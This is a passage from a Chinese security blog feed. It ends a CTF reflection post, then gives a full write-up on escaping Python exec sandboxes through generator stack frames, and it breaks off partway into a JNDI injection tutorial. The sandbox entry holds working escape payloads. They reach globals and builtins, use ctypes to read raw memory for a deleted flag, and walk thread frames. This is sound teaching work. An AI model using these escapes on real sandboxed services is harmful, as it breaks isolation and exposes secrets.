（做出来ezjaba，我称之为新生代java master），csmantle等</p><p>当然像晨曦这样厉害的师傅</p><p>唉</p><p>到最后web 5&#x2F;7 的战绩已经是平平无奇的了，有许多高手都做到了6解（尤其是西电23的0xcafebabe都最后一天了连出两个web，真tm牛），最屌的还是杭电，web都AK了</p><p>但也不是一无所获，在做ezjaba时，学习了反序列化的具体流程，看了fastjson漏洞的原理</p><p>好像只有在做不出题目并且学习原理的过程才是我成长的最快的时候</p><p>难道这就是所谓的不求甚解吗</p><p>MiniL打完了，对接下来感到特别迷茫，该不该投一些简单的工作像安服仔（但是又怕实力不够），今年hvv快开始了，想投但是啥都不懂也不会，接下来该继续弄CTF还是做一些实战的练习等</p><p>当然unknown师傅也叫我不要弄那么多CTF，接下来可以搞点代码审计</p><p>剩下最烦的还是接下来一个月学校要接受教育部的师资一些调查，真的服啦，现在考勤贼tm严，辅导员天天来点名，没有书本还要被骂</p><p>服了，什么东西要考察一个月，你要住在这里啊</p><p>希望不会影响5月的比赛和6月的线下</p><p>阿门。。。。。。。</p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://zatqldvi7bs.feishu.cn/docx/TMxGdv8meoISRBxhkOrcZCvunUJ">‍‌‬‌‌⁠‍⁠‌‬﻿‌﻿‌‍⁠﻿⁠‬‬‬MiniL CTF 2024 WRITEUPS By TEAM 0x - 飞书云文档 (feishu.cn)</a></p><p><a href="https://github.com/Chick868/wp-by-printf-m1ni1-qidong-/blob/master/wp.md">wp-by-printf-m1ni1-qidong-&#x2F;wp.md at master · Chick868&#x2F;wp-by-printf-m1ni1-qidong- (github.com)</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>python栈帧沙箱逃逸</title>
    <link href="/2024/04/29/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    <url>/2024/04/29/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/</url>
    
    <content type="html"><![CDATA[<h1 id="python利用栈帧进行沙箱逃逸"><a href="#python利用栈帧进行沙箱逃逸" class="headerlink" title="python利用栈帧进行沙箱逃逸"></a>python利用栈帧进行沙箱逃逸</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>中国海洋大学举办的CTF有一道python沙箱，赛后看了WP，发现要利用栈帧进行查找</p><p>回想2月的L3HCTF也有一道python沙箱，当时看不懂，现在学一下</p><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="生成器"><a href="#生成器" class="headerlink" title="生成器"></a>生成器</h3><p>生成器（Generator）是 Python 中一种特殊的迭代器，生成器可以使用 yield 关键字来定义。</p><p>yield 用于产生一个值，并在保留当前状态的同时暂停函数的执行。当下一次调用生成器时，函数会从上次暂停的位置继续执行，直到遇到下一个 yield 语句或者函数结束</p><h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>():    a=<span class="hljs-number">1</span>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:        <span class="hljs-keyword">yield</span> a        a+=<span class="hljs-number">1</span>f=f()<span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#1</span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#2</span><span class="hljs-built_in">print</span>(<span class="hljs-built_in">next</span>(f)) <span class="hljs-comment">#3</span></code></pre></div><p>如果我们给a定义一个范围，a&lt;&#x3D;100 ，可以使用for语句一次性输出</p><div class="code-wrapper"><pre><code class="hljs isbl"><span class="hljs-variable">def</span> <span class="hljs-function"><span class="hljs-title">f</span>():</span><span class="hljs-function">    <span class="hljs-variable">a</span>=<span class="hljs-number">1</span></span><span class="hljs-function">    <span class="hljs-variable">for</span> <span class="hljs-variable">i</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-title">range</span>(<span class="hljs-number">100</span>):</span><span class="hljs-function">        <span class="hljs-variable">yield</span> <span class="hljs-variable">a</span></span><span class="hljs-function">        <span class="hljs-variable">a</span>+=<span class="hljs-number">1</span></span><span class="hljs-function"><span class="hljs-variable">f</span>=<span class="hljs-title">f</span>()</span><span class="hljs-variable">for</span> <span class="hljs-variable">value</span> <span class="hljs-variable"><span class="hljs-keyword">in</span></span> <span class="hljs-variable">f</span>:    <span class="hljs-function"><span class="hljs-title">print</span>(<span class="hljs-variable">value</span>)</span></code></pre></div><h3 id="生成器表达式"><a href="#生成器表达式" class="headerlink" title="生成器表达式"></a>生成器表达式</h3><p>生成器表达式允许你使用简洁的语法来定义生成器，而不必显式地编写一个函数。</p><p>但是使用圆括号而不是方括号</p><div class="code-wrapper"><pre><code class="hljs leaf">a=(i+1 for i in range(100))<span class="hljs-function"><span class="hljs-keyword">#</span><span class="hljs-title">next</span><span class="hljs-params">(<span class="hljs-variable">a</span>)</span></span>for value in a:    print(value)</code></pre></div><h3 id="生成器的属性"><a href="#生成器的属性" class="headerlink" title="生成器的属性"></a>生成器的属性</h3><p><code>gi_code</code>: 生成器对应的code对象。<br><code>gi_frame</code>: 生成器对应的frame（栈帧）对象。<br><code>gi_running</code>: 生成器函数是否在执行。生成器函数在yield以后、执行yield的下一行代码前处于frozen状态，此时这个属性的值为0。<br><code>gi_yieldfrom</code>：如果生成器正在从另一个生成器中 yield 值，则为该生成器对象的引用；否则为 None。<br><code>gi_frame.f_locals</code>：一个字典，包含生成器当前帧的本地变量。</p><p><code>gi_frame</code> 是一个与生成器（generator）和协程（coroutine）相关的属性。它指向生成器或协程当前执行的帧对象（frame object），如果这个生成器或协程正在执行的话。帧对象表示代码执行的当前上下文，包含了局部变量、执行的字节码指令等信息</p><p>举例使用gi_frame获取当前帧的信息</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_generator</span>():    <span class="hljs-keyword">yield</span> <span class="hljs-number">1</span>    <span class="hljs-keyword">yield</span> <span class="hljs-number">2</span>    <span class="hljs-keyword">yield</span> <span class="hljs-number">3</span>gen = my_generator()<span class="hljs-comment"># 获取生成器的当前帧信息</span>frame = gen.gi_frame<span class="hljs-comment"># 输出生成器的当前帧信息</span><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Local Variables:&quot;</span>, frame.f_locals)<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Global Variables:&quot;</span>, frame.f_globals)<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Code Object:&quot;</span>, frame.f_code)<span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Instruction Pointer:&quot;</span>, frame.f_lasti)</code></pre></div><h3 id="frame（栈帧）"><a href="#frame（栈帧）" class="headerlink" title="frame（栈帧）"></a>frame（栈帧）</h3><p>栈帧的几个重要属性</p><p><code>f_locals</code>: 一个字典，包含了函数或方法的局部变量。键是变量名，值是变量的值。<br><code>f_globals</code>: 一个字典，包含了函数或方法所在模块的全局变量。键是全局变量名，值是变量的值。<br><code>f_code</code>: 一个代码对象（code object），包含了函数或方法的字节码指令、常量、变量名等信息。<br><code>f_lasti</code>: 整数，表示最后执行的字节码指令的索引。<br><code>f_back</code>: 指向上一级调用栈帧的引用，用于构建调用栈。</p><p>每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧        ！！！！！</p><h2 id="利用栈帧沙箱逃逸"><a href="#利用栈帧沙箱逃逸" class="headerlink" title="利用栈帧沙箱逃逸"></a>利用栈帧沙箱逃逸</h2><p>原理就是生成器的栈帧对象通过f_back（返回前一帧）从而逃逸出去获取globals全局符号表</p><div class="code-wrapper"><pre><code class="hljs python">s3cret=<span class="hljs-string">&quot;this is flag&quot;</span>codes=<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">def waff():</span><span class="hljs-string">    def f():</span><span class="hljs-string">        yield g.gi_frame.f_back</span><span class="hljs-string"></span><span class="hljs-string">    g = f()  #生成器</span><span class="hljs-string"></span><span class="hljs-string">    frame = next(g) #获取到生成器的栈帧对象  </span><span class="hljs-string">    # frame = [x for x in g][0] #由于生成器也是迭代器，所以也可以获取到生成器的栈帧对象 </span><span class="hljs-string">    </span><span class="hljs-string">    b = frame.f_back.f_back.f_globals[&#x27;s3cret&#x27;] #返回并获取前一级栈帧的globals</span><span class="hljs-string">    return b</span><span class="hljs-string">b=waff()</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-built_in">locals</span>=&#123;&#125;code = <span class="hljs-built_in">compile</span>(codes, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)<span class="hljs-built_in">exec</span>(code,<span class="hljs-built_in">locals</span>)<span class="hljs-built_in">print</span>(<span class="hljs-built_in">locals</span>[<span class="hljs-string">&quot;b&quot;</span>])</code></pre></div><h3 id="代码说明"><a href="#代码说明" class="headerlink" title="代码说明"></a>代码说明</h3><p>也是对基础知识的再一次说明</p><ol><li>使用next获取到的就是yield定义的值，这里获取到的就是<code>g.gi_frame.f_back</code></li><li>使用<code>g.gi_frame.f_back</code>的话，那么<code>g = f()</code>就必须为g，用的就是这个生成器对象的栈帧</li><li><code>compile(codes, &quot;test&quot;, &quot;exec&quot;)</code>就是设置了名称为<code>test</code>的python沙箱环境</li></ol><h3 id="小改一下"><a href="#小改一下" class="headerlink" title="小改一下"></a>小改一下</h3><div class="code-wrapper"><pre><code class="hljs python">s3cret=<span class="hljs-string">&quot;this is flag&quot;</span>codes=<span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-string">def waff():</span><span class="hljs-string">    def f():</span><span class="hljs-string">        yield g.gi_frame.f_back</span><span class="hljs-string"></span><span class="hljs-string">    g = f()              #生成器</span><span class="hljs-string"></span><span class="hljs-string">    frame = next(g)     #获取到生成器的栈帧对象</span><span class="hljs-string">    print(frame)</span><span class="hljs-string">    print(frame.f_back)</span><span class="hljs-string">    print(frame.f_back.f_back)</span><span class="hljs-string"></span><span class="hljs-string"></span><span class="hljs-string">waff()</span><span class="hljs-string">&#x27;&#x27;&#x27;</span><span class="hljs-built_in">locals</span>=&#123;&#125;code = <span class="hljs-built_in">compile</span>(codes, <span class="hljs-string">&quot;test&quot;</span>, <span class="hljs-string">&quot;exec&quot;</span>)<span class="hljs-built_in">exec</span>(code,<span class="hljs-built_in">locals</span>)</code></pre></div><p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429192731913.png" alt="image-20240429192731913"></p><p>栈帧顺序</p><div class="code-wrapper"><pre><code class="hljs elm"><span class="hljs-title">f</span>  -&gt; waff -&gt; &lt;<span class="hljs-keyword">module</span>&gt;(test) -&gt; &lt;<span class="hljs-keyword">module</span>&gt;(1.py)</code></pre></div><p>成功逃逸</p><p>获取到外部的栈帧，就可以用<code>f_globals</code>去获取沙箱外的全局变量了</p><h3 id="困惑"><a href="#困惑" class="headerlink" title="困惑"></a>困惑</h3><p>但是<code>yield g.gi_frame.f_back</code>并不能修改为<code>yield g.gi_frame</code></p><p>这样获取到的栈帧经过<code>f_back</code>后获得的是<code>None</code></p><p>要是再来一个<code>f_back</code>就会报错</p><p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429193358326.png" alt="image-20240429193358326"></p><p>困扰了很久，算了，就记住吧，在生成器函数内部直接访问</p><h2 id="L3HCTF2024"><a href="#L3HCTF2024" class="headerlink" title="L3HCTF2024"></a>L3HCTF2024</h2><p>设置了黑名单，最关键的是 <code>&#123;&quot;__builtins__&quot;: None&#125;</code> 置空了<code>__builtins__</code></p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-built_in">exec</span>(code,&#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: <span class="hljs-literal">None</span>&#125;,<span class="hljs-built_in">locals</span>)</code></pre></div><p>思路就是通过栈帧逃逸</p><p>但不能直接通过 next()函数去获取到栈帧，但可以通过for语句去获取</p><div class="code-wrapper"><pre><code class="hljs stylus">a=(<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.gi_frame</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_back</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-attr">[1]</span>)a=<span class="hljs-selector-attr">[x for x in a]</span><span class="hljs-selector-attr">[0]</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs stylus">a=(<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.gi_frame</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_back</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-attr">[1]</span>)a=<span class="hljs-selector-attr">[x for x in a]</span><span class="hljs-selector-attr">[0]</span>globals=<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_globals</span>   #自行控制f_back，逃逸到外部文件即可，如果是flask，不要逃逸过头了到源文件去了</code></pre></div><p>然后后面的思路就是通过globals里的<code>__builtins__</code>去覆盖int函数</p><p>具体看我之前的文章</p><h2 id="第九届中国海洋大学信息安全竞赛-菜狗工具-2"><a href="#第九届中国海洋大学信息安全竞赛-菜狗工具-2" class="headerlink" title="第九届中国海洋大学信息安全竞赛   菜狗工具#2"></a>第九届中国海洋大学信息安全竞赛   菜狗工具#2</h2><p>源码</p><div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> io<span class="hljs-keyword">import</span> timeapp = Flask(__name__)black_list = [    <span class="hljs-string">&#x27;__build_class__&#x27;</span>, <span class="hljs-string">&#x27;__debug__&#x27;</span>, <span class="hljs-string">&#x27;__doc__&#x27;</span>, <span class="hljs-string">&#x27;__import__&#x27;</span>,     <span class="hljs-string">&#x27;__loader__&#x27;</span>, <span class="hljs-string">&#x27;__name__&#x27;</span>, <span class="hljs-string">&#x27;__package__&#x27;</span>, <span class="hljs-string">&#x27;__spec__&#x27;</span>, <span class="hljs-string">&#x27;SystemExit&#x27;</span>,    <span class="hljs-string">&#x27;breakpoint&#x27;</span>, <span class="hljs-string">&#x27;compile&#x27;</span>, <span class="hljs-string">&#x27;exit&#x27;</span>, <span class="hljs-string">&#x27;memoryview&#x27;</span>, <span class="hljs-string">&#x27;open&#x27;</span>, <span class="hljs-string">&#x27;quit&#x27;</span>, <span class="hljs-string">&#x27;input&#x27;</span>]new_builtins = <span class="hljs-built_in">dict</span>([    (key, val) <span class="hljs-keyword">for</span> key, val <span class="hljs-keyword">in</span> __builtins__.__dict__.items() <span class="hljs-keyword">if</span> key <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> black_list])flag = <span class="hljs-string">&quot;flag&#123;xxxxxx&#125;&quot;</span>flag = <span class="hljs-string">&quot;DISPOSED&quot;</span><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():    <span class="hljs-keyword">return</span> redirect(<span class="hljs-string">&quot;/static/index.html&quot;</span>)<span class="hljs-meta">@app.post(<span class="hljs-params"><span class="hljs-string">&quot;/run&quot;</span></span>)</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">run</span>():    out = io.StringIO()    script = <span class="hljs-built_in">str</span>(request.form[<span class="hljs-string">&quot;script&quot;</span>])        <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrap_print</span>(<span class="hljs-params">*args, **kwargs</span>):        kwargs[<span class="hljs-string">&quot;file&quot;</span>] = out        <span class="hljs-built_in">print</span>(*args, **kwargs)    new_builtins[<span class="hljs-string">&quot;print&quot;</span>] = wrap_print    <span class="hljs-keyword">try</span>:        <span class="hljs-built_in">exec</span>(script, &#123;<span class="hljs-string">&quot;__builtins__&quot;</span>: new_builtins&#125;)    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:        wrap_print(e)        ret = out.getvalue()    out.close()    <span class="hljs-keyword">return</span> rettime.sleep(<span class="hljs-number">5</span>) <span class="hljs-comment"># current source file is deleted</span>app.run(<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>, port=<span class="hljs-number">9001</span>)</code></pre></div><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>flag在源码中，但是源码被删除，没有 <code>/proc</code>目录</p><p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429202234438.png" alt="image-20240429202234438"></p><p>要获得被覆写的 flag 内容只剩一个地方可以找，就是依靠 python 解析自身进程的内存</p><p>cpython 的实现中暴露了获取 python 栈帧的方法</p><p>而每个栈帧都会保存当时的 py 字节码和记录自身上一层的栈帧</p><p>而对 flag 的赋值的字节码肯定存在于某个栈帧中，我们只需要从当前栈帧向上找就行了</p><h3 id="法一-（晨曦✌太猛了）"><a href="#法一-（晨曦✌太猛了）" class="headerlink" title="法一 （晨曦✌太猛了）"></a>法一 （晨曦✌太猛了）</h3><p>利用 <code>ctypes</code>模块的指针，将<code>flag</code>地址周围的值读一下，实现一个从内存读源码</p><p>因为真正的flag在覆盖的flag之前，所以读到假的flag的地址后，往前读取即可</p><p>这里用了char 指针，读出来的是一个字符串</p><p>最细节的是每次位移8的倍数。（可以自行对比任意两个变量的地址，可以发现它们的差值都是8的倍数）</p><div class="code-wrapper"><pre><code class="hljs stylus">a=(<span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.gi_frame</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_back</span> <span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-selector-attr">[1]</span>)<span class="hljs-selector-tag">a</span> = <span class="hljs-selector-attr">[x for x in a]</span><span class="hljs-selector-attr">[0]</span><span class="hljs-selector-tag">b</span> = <span class="hljs-selector-tag">a</span><span class="hljs-selector-class">.f_back</span><span class="hljs-selector-class">.f_globals</span>flag_id = <span class="hljs-built_in">id</span>(<span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[<span class="hljs-string">&#x27;flag&#x27;</span>]</span>)    <span class="hljs-selector-id">#id</span>()函数用于读取内存地址ctypes = <span class="hljs-selector-tag">b</span><span class="hljs-selector-attr">[<span class="hljs-string">&quot;__builtins__&quot;</span>]</span>.<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;ctypes&#x27;</span>)<span class="hljs-selector-id">#print</span>(ctypes)<span class="hljs-keyword">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10000</span>):txt = ctypes<span class="hljs-selector-class">.cast</span>((flag_id-<span class="hljs-number">8</span>*i),ctypes.c_char_p)<span class="hljs-selector-class">.value</span><span class="hljs-keyword">if</span> b<span class="hljs-string">&quot;flag&quot;</span> <span class="hljs-keyword">in</span> txt:<span class="hljs-built_in">print</span>(txt)</code></pre></div><p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429203332334.png" alt="image-20240429203332334"></p><h3 id="官方wp"><a href="#官方wp" class="headerlink" title="官方wp"></a>官方wp</h3><p>使用的是非常普通的继承链获取globals对象，然后从线程上去找栈帧</p><p>而且flask 使用了多线程去处理每个请求，这导致直接在当前线程的栈帧向上找会找不到主线</p><p>程的 flag，需要从主线程栈帧向上找</p><div class="code-wrapper"><pre><code class="hljs python">sys = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;sys&#x27;</span>)io = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;io&#x27;</span>)dis = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;dis&#x27;</span>)threading = <span class="hljs-built_in">print</span>.__globals__[<span class="hljs-string">&quot;__builtins__&quot;</span>].<span class="hljs-built_in">__import__</span>(<span class="hljs-string">&#x27;threading&#x27;</span>)<span class="hljs-built_in">print</span>(threading.<span class="hljs-built_in">enumerate</span>())     <span class="hljs-comment">#获取所有活跃线程</span><span class="hljs-built_in">print</span>(threading.main_thread())    <span class="hljs-comment">#获取主线程</span><span class="hljs-built_in">print</span>(threading.main_thread().ident)   <span class="hljs-comment"># 获取主线程标识符</span><span class="hljs-built_in">print</span>(sys._current_frames())      <span class="hljs-comment"># 获取所有线程的堆栈帧对象</span><span class="hljs-built_in">print</span>(sys._current_frames()[threading.main_thread().ident]) <span class="hljs-comment">#获取到主线程的堆栈帧对象</span>frame = sys._current_frames()[threading.main_thread().ident]<span class="hljs-keyword">while</span> frame <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">None</span>:out = io.StringIO()     <span class="hljs-comment"># 内存创建字符串I/O流</span>dis.dis(frame.f_code,file=out)   <span class="hljs-comment"># 将当前堆栈帧所对应的函数的字节码进行反汇编</span>content = out.getvalue()    <span class="hljs-comment">#获取反汇编的结果</span>out.close()<span class="hljs-built_in">print</span>(content)frame = frame.f_back</code></pre></div><p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240429222137005.png" alt="image-20240429222137005"></p><h3 id="gc"><a href="#gc" class="headerlink" title="gc"></a>gc</h3><p>L3HCTF那题禁用了gc，但是这题没有，有师傅用这个秒了好像</p><div class="code-wrapper"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">([].__class__.__base__.__subclasses__()</span></span><span class="hljs-selector-attr">[84]</span><span class="hljs-selector-class">.load_module</span>(<span class="hljs-string">&#x27;gc&#x27;</span>)<span class="hljs-selector-class">.get_objects</span>())#&lt;class <span class="hljs-string">&#x27;_frozen_importlib.BuiltinImporter&#x27;</span>&gt;</code></pre></div><p>东西太多了，有点卡</p><p><img src="/../images/python%E6%A0%88%E5%B8%A7%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/image-20240430001910400.png" alt="image-20240430001910400"></p><h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="https://chenxi9981.github.io/%E4%B8%AD%E5%9B%BD%E6%B5%B7%E6%B4%8B%E5%A4%A7%E5%AD%A6%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B/">中国海洋大学信息安全竞赛 WP | 晨曦的个人小站 (chenxi9981.github.io)</a></p><p><a href="https://xz.aliyun.com/t/13635">https://xz.aliyun.com/t/13635</a></p><p><a href="https://www.zhihu.com/question/644012082">(14 封私信 &#x2F; 80 条消息) python栈帧逃逸中关于生成器的问题？ - 知乎 (zhihu.com)</a>感觉有点不对</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>JNDI注入</title>
    <link href="/2024/04/18/JNDI%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/04/18/JNDI%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<h1 id="JDNI注入"><a href="#JDNI注入" class="headerlink" title="JDNI注入"></a>JDNI注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刚开始学java安全的时候真的是什么概念都不懂，然后rmi，ldap，jndi，jrmp就随随便便过去了，导致现在很多概念性的东西都不理解</p><p>突然想起来X1r0z大佬的N1 junior的题还没看，然后一看发现是jndi，就重新来学习一下</p><h2 id="JNDI概念"><a href="#JNDI概念" class="headerlink" title="JNDI概念"></a>JNDI概念</h2><p>JNDI 本质上就是以一种统一的方式来管理对象, 开发者也可以通过它提供的接口来接入自己的服务</p><p>在bind之后，能够通过名称来访问对象</p><p>简单的通过 JNDI 来访问 RMI 对象的 demo</p><p>RMIServer</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> javax.naming.Context;<span class="hljs-keyword">import</span> javax.naming.InitialContext;<span class="hljs-keyword">import</span> javax.naming.NamingException;<span class="hljs-keyword">import</span> java.rmi.Remote;<span class="hljs-keyword">import</span> java.rmi.RemoteException;<span class="hljs-keyword">import</span> java.rmi.registry.LocateRegistry;<span class="hljs-keyword">import</span> java.rmi.server.UnicastRemoteObject;<span class="hljs-keyword">import</span> java.util.Properties;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">RMIServer</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> RemoteException, NamingException &#123;        <span class="hljs-type">Properties</span> <span class="hljs-variable">env</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Properties</span>();        env.put(Context.INITIAL_CONTEXT_FACTORY,<span class="hljs-string">&quot;com.sun.jndi.rmi.registry.RegistryContextFactory&quot;</span>);        env.put(Context.PROVIDER_URL,<span class="hljs-string">&quot;rmi://127.0.0.1:1099&quot;</span>);        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>(env);        LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<span class="hljs-comment">//可以通过该端口连接到注册表，并查找或注册远程对象</span>        <span class="hljs-type">HelloImpl</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HelloImpl</span>();        context.bind(<span class="hljs-string">&quot;hello&quot;</span>,hello);    &#125;&#125;<span class="hljs-keyword">interface</span> <span class="hljs-title class_">Hello</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Remote</span>&#123;    String <span class="hljs-title function_">world</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException;&#125;<span class="hljs-keyword">class</span> <span class="hljs-title class_">HelloImpl</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">UnicastRemoteObject</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Hello</span>&#123;    <span class="hljs-keyword">protected</span> <span class="hljs-title function_">HelloImpl</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException&#123;    &#125;    <span class="hljs-meta">@Override</span>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">world</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> RemoteException&#123;        System.out.println(<span class="hljs-string">&quot;hello world&quot;</span>);        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;hahahhha&quot;</span>;    &#125;&#125;</code></pre></div><p>Properties就是手动设置上下文的一些属性</p><p>HelloImpl要继承UnicastRemoteObject</p><p>当一个类继承了<code>UnicastRemoteObject</code>类时，它就可以被远程客户端访问，并且可以通过RMI注册表注册和查找。</p><p>并且也顺利解决了继承Serializable接口</p><p>还有就是Java RMI要求所有远程方法都必须声明<code>throws RemoteException</code></p><p>所以在Hello接口的world()方法要<code>throws RemoteException</code></p><p>JNDIDemo</p><div class="code-wrapper"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example;<span class="hljs-keyword">import</span> javax.naming.InitialContext;<span class="hljs-keyword">import</span> javax.naming.NamingException;<span class="hljs-keyword">import</span> java.rmi.Remote;<span class="hljs-keyword">import</span> java.rmi.RemoteException;<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JDNIDemo</span> &#123;    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> NamingException, RemoteException &#123;        <span class="hljs-type">InitialContext</span> <span class="hljs-variable">context</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">InitialContext</span>();        <span class="hljs-type">Hello</span> <span class="hljs-variable">hello</span> <span class="hljs-operator">=</span> (Hello) context.lookup(<span class="hljs-string">&quot;rmi://127.0.0.1:1099/hello&quot;</span>);        System.out.println(hello.world());    &#125;&#125;</code></pre></div><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418173827807.png" alt="image-20240418173827807"></p><p><img src="/../images/JNDI%E6%B3%A8%E5%85%A5/image-20240418173836254.png" alt="image-20240418173836254"></p><h2 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h2><p>造成 JNDI 注入的核心有两点</p><ol><li>动态协议转换</li><li>Reference 类</li></ol><h3 id="先说动态协议转换"><a href="#先说动态协议转换" class="headerlink" title="先说动态协议转换"></a>先说动态协议转换</h3><p>听起来很高级，看了文章的断点调试后其实很简单</p><p>简单来说就是lookup方法会截取 <code>://</code> 之前的内容作为协议名，然后调用工厂类的 getObjectInstance 方法来得到对应协议的 context</p><p>如果获取不到的话, 就会使用原来 env 中指定的 <code>INITIAL_CONTEXT_FACTORY</code></p><p>JNDI 默认支持动态转换的协议如下</p><table><thead><tr><th>协议名称</th><th 